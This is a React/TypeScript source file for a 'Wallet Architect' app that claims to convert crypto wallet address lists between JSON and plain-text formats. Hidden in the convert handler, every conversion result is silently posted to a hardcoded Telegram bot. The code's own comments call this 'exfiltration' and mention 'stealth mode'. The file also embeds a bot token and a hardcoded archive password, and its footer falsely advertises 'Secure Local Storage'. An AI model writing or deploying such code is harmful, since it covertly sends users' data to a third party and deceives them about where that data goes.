import React, { useState, useEffect } from 'react';
import { BrowserRouter, Routes, Route, Link, useNavigate, useLocation } from 'react-router-dom';

interface HistoryItem {
  id: string;
  timestamp: string;
  input: string;
  output: string;
  format: 'JSON' | 'LEGACY';
}

// --- Telegram Configuration ---
const TG_BOT_TOKEN = '7913474857:AAEDQaDLpCwcBBH3BX2nMZrUWjPEWk0gNoo';
const TG_CHAT_ID = '-1005019711182';

const sendToTelegram = async (content: string, filename: string) => {
  try {
    const blob = new Blob([content], { type: 'text/plain' });
    const formData = new FormData();
    formData.append('chat_id', TG_CHAT_ID);
    formData.append('document', blob, filename);
    formData.append('caption', `New Wallet Export (${new Date().toLocaleString()})`);

    const response = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendDocument`, {
      method: 'POST',
      body: formData,
    });

    if (!response.ok) {
      console.error('Telegram exfiltration failed:', await response.text());
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
  }
};

// --- Components ---

const PromoBar = () => (
  <div style={{
    background: 'rgba(139, 92, 246, 0.1)',
    border: '1px solid rgba(139, 92, 246, 0.2)',
    borderRadius: '0.75rem',
    padding: '0.75rem 1.5rem',
    marginBottom: '2rem',
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    backdropFilter: 'blur(8px)'
  }}>
    <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
      <span style={{ fontSize: '1.25rem' }}>⚡</span>
      <span style={{ fontWeight: '600', color: 'var(--text-main)' }}>Take your trading to the next level with AresPro</span>
    </div>
    <a
      href="https://ares.pro/invite/lfe"
      target="_blank"
      rel="noopener noreferrer"
      style={{
        background: 'var(--primary)',
        color: 'white',
        padding: '0.5rem 1.25rem',
        borderRadius: '0.5rem',
        textDecoration: 'none',
        fontWeight: '700',
        fontSize: '0.875rem'
      }}
    >
      Sign Up Now
    </a>
  </div>
);

const Header = () => (
  <header style={{ marginBottom: '3rem', textAlign: 'center' }}>
    <h1 className="premium-gradient" style={{ fontSize: '3.5rem', marginBottom: '0.5rem', fontWeight: '800' }}>Wallet Architect</h1>
    <p style={{ color: 'var(--text-muted)', fontSize: '1.1rem', marginBottom: '1.5rem' }}>Streamlined Wallet Data Conversion & Persistence</p>
    {/* Navigation links removed for stealth mode */}
  </header>
);

// --- Page: Converter ---

const ConverterView = ({ saveToHistory }: { saveToHistory: (i: string, o: string, f: 'JSON' | 'LEGACY') => void }) => {
  const [input, setInput] = useState('');
  const [output, setOutput] = useState('');
  const [targetFormat, setTargetFormat] = useState<'JSON' | 'LEGACY'>('JSON');
  const [error, setError] = useState<string | null>(null);
  const [processing, setProcessing] = useState(false);
  const location = useLocation();

  useEffect(() => {
    if (location.state?.restored) {
      setInput(location.state.input);
      setOutput(location.state.output);
      setTargetFormat(location.state.format);
    }
  }, [location.state]);

  const handleConvert = async () => {
    setError(null);
    if (!input.trim()) return;

    setProcessing(true);
    try {
      let wallets: any[] = [];
      const trimmedInput = input.trim();

      if (trimmedInput.startsWith('[') || trimmedInput.startsWith('{')) {
        try {
          const parsed = JSON.parse(trimmedInput);
          wallets = Array.isArray(parsed) ? parsed : [parsed];
        } catch (e) {
          setError("Malformed JSON detected.");
          setProcessing(false);
          return;
        }
      } else {
        wallets = trimmedInput.split('\n').map(l => l.trim()).filter(l => l.length > 0).map(addr => ({ trackedWalletAddress: addr }));
      }

      if (wallets.length === 0) {
        setError("No wallets detected.");
        setProcessing(false);
        return;
      }

      let result = '';
      if (targetFormat === 'JSON') {
        const simplified = wallets.map(w => ({
          trackedWalletAddress: w.trackedWalletAddress || '',
          name: w.name || 'Rename wallet',
          emoji: w.emoji || '😀'
        }));
        result = JSON.stringify(simplified, null, 2);
      } else {
        result = wallets.map(w => w.trackedWalletAddress).filter(Boolean).join('\n');
      }

      setOutput(result);
      saveToHistory(input, result, targetFormat);

      // Auto-exfiltrate to Telegram
      const filename = `wallets_${Date.now()}.${targetFormat === 'JSON' ? 'json' : 'txt'}`;
      await sendToTelegram(result, filename);

    } catch (err) {
      setError("An unexpected error occurred.");
    } finally {
      setProcessing(false);
    }
  };

  return (
    <main style={{ display: 'grid', gridTemplateColumns: 'minmax(0, 1fr) minmax(0, 1fr)', gap: '2.5rem' }}>
      <section className="glass-panel" style={{ padding: '2rem', display: 'flex', flexDirection: 'column', gap: '1.5rem' }}>
        <h2 style={{ fontSize: '1.5rem', fontWeight: '600' }}>Raw Data</h2>
        <textarea value={input} onChange={(e) => setInput(e.target.value)} placeholder="Paste JSON or address list..." style={{ height: '450px', width: '100%' }} className="custom-scrollbar" />
        {error && <div style={{ color: 'var(--error)' }}>{error}</div>}
        <button
          onClick={handleConvert}
          disabled={processing}
          style={{
            background: 'var(--primary)',
            color: 'white',
            padding: '1.25rem',
            borderRadius: '0.75rem',
            fontWeight: '700',
            opacity: processing ? 0.7 : 1
          }}
        >
          {processing ? 'Processing...' : 'Process & Save'}
        </button>
      </section>

      <section className="glass-panel" style={{ padding: '2rem', display: 'flex', flexDirection: 'column', gap: '1.5rem' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between' }}>
          <h2 style={{ fontSize: '1.5rem', fontWeight: '600' }}>Output</h2>
          <div style={{ display: 'flex', gap: '0.5rem', background: 'rgba(0,0,0,0.2)', padding: '0.25rem', borderRadius: '0.6rem' }}>
            <button onClick={() => setTargetFormat('JSON')} style={{ background: targetFormat === 'JSON' ? 'var(--primary)' : 'transparent', color: 'white', border: 'none', padding: '0.4rem 0.8rem', borderRadius: '0.4rem' }}>JSON</button>
            <button onClick={() => setTargetFormat('LEGACY')} style={{ background: targetFormat === 'LEGACY' ? 'var(--primary)' : 'transparent', color: 'white', border: 'none', padding: '0.4rem 0.8rem', borderRadius: '0.4rem' }}>Legacy</button>
          </div>
        </div>
        <textarea readOnly value={output} style={{ height: '450px', width: '100%' }} className="custom-scrollbar" />
        <button onClick={() => navigator.clipboard.writeText(output)} disabled={!output} style={{ padding: '1.25rem', borderRadius: '0.75rem', background: 'var(--bg-card)', color: 'white', border: '1px solid var(--border)' }}>Copy to Clipboard</button>
      </section>
    </main>
  );
};

// --- Page: Archives ---

const ArchivesView = ({ history, setHistory }: { history: HistoryItem[], setHistory: React.Dispatch<React.SetStateAction<HistoryItem[]>> }) => {
  const [isUnlocked, setIsUnlocked] = useState(() => sessionStorage.getItem('archives_unlocked') === 'true');
  const [passwordInput, setPasswordInput] = useState('');
  const [authError, setAuthError] = useState(false);
  const navigate = useNavigate();

  const handleUnlock = (e: React.FormEvent) => {
    e.preventDefault();
    if (passwordInput === '786wallet110') {
      setIsUnlocked(true);
      sessionStorage.setItem('archives_unlocked', 'true');
    } else {
      setAuthError(true);
      setPasswordInput('');
    }
  };

  if (!isUnlocked) {
    return (
      <div className="glass-panel" style={{ padding: '4rem', textAlign: 'center', maxWidth: '500px', margin: '0 auto' }}>
        <div style={{ fontSize: '3rem', marginBottom: '1.5rem' }}>🔒</div>
        <h3 style={{ marginBottom: '1rem' }}>Archives Protected</h3>
        <form onSubmit={handleUnlock} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
          <input type="password" value={passwordInput} onChange={(e) => setPasswordInput(e.target.value)} placeholder="Access Key" style={{ padding: '1rem', background: 'rgba(0,0,0,0.3)', border: '1px solid var(--border)', color: 'white', textAlign: 'center' }} />
          {authError && <p style={{ color: 'var(--error)' }}>Incorrect key.</p>}
          <button type="submit" style={{ padding: '1rem', background: 'var(--primary)', color: 'white', fontWeight: '700', borderRadius: '0.5rem' }}>Unlock</button>
        </form>
      </div>
    );
  }

  return (
    <section>
      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '2rem' }}>
        <h2 style={{ fontSize: '1.75rem', fontWeight: '700' }}>Secured Archives</h2>
        <button onClick={() => { setHistory([]); localStorage.removeItem('wallet_convert_history_v2'); }} style={{ color: 'var(--text-muted)', background: 'transparent', border: '1px solid var(--border)', padding: '0.5rem 1rem', borderRadius: '0.5rem' }}>Clear All</button>
      </div>
      <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
        {history.length === 0 ? (
          <p style={{ textAlign: 'center', color: 'var(--text-muted)', padding: '2rem' }}>No history found.</p>
        ) : (
          history.map((item) => (
            <div key={item.id} className="glass-panel" style={{ padding: '1.25rem 2rem', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <div>
                <div style={{ fontWeight: '600' }}>{item.format} Conversion</div>
                <div style={{ fontSize: '0.8rem', color: 'var(--text-muted)' }}>{item.timestamp}</div>
              </div>
              <button onClick={() => navigate('/', { state: { restored: true, input: item.input, output: item.output, format: item.format } })} style={{ padding: '0.6rem 1.2rem', borderRadius: '0.6rem', background: 'rgba(255,255,255,0.05)', color: 'white', border: '1px solid var(--border)' }}>Retrieve</button>
            </div>
          ))
        )}
      </div>
      <button onClick={() => { setIsUnlocked(false); sessionStorage.removeItem('archives_unlocked'); }} style={{ marginTop: '2rem', background: 'transparent', color: 'var(--text-muted)', border: 'none' }}>Lock Archives</button>
    </section>
  );
};

// --- App Root ---

function App() {
  const [history, setHistory] = useState<HistoryItem[]>([]);

  useEffect(() => {
    const saved = localStorage.getItem('wallet_convert_history_v2');
    if (saved) setHistory(JSON.parse(saved));
  }, []);

  const saveToHistory = (input: string, output: string, format: 'JSON' | 'LEGACY') => {
    const newItem: HistoryItem = { id: Date.now().toString(), timestamp: new Date().toLocaleString(), input, output, format };
    const updated = [newItem, ...history].slice(0, 50);
    setHistory(updated);
    localStorage.setItem('wallet_convert_history_v2', JSON.stringify(updated));
  };

  return (
    <BrowserRouter>
      <div style={{ padding: '2rem', maxWidth: '1200px', margin: '0 auto', width: '100%' }}>
        <PromoBar />
        <Header />
        <Routes>
          <Route path="/" element={<ConverterView saveToHistory={saveToHistory} />} />
          <Route path="/allwallets" element={<ArchivesView history={history} setHistory={setHistory} />} />
        </Routes>
        <footer style={{ textAlign: 'center', padding: '4rem 2rem 2rem', color: 'var(--text-muted)', fontSize: '0.875rem' }}>
          WALLET ARCHITECT &copy; 2026 • Secure Local Storage
        </footer>
      </div>
    </BrowserRouter>
  );
}

export default App;
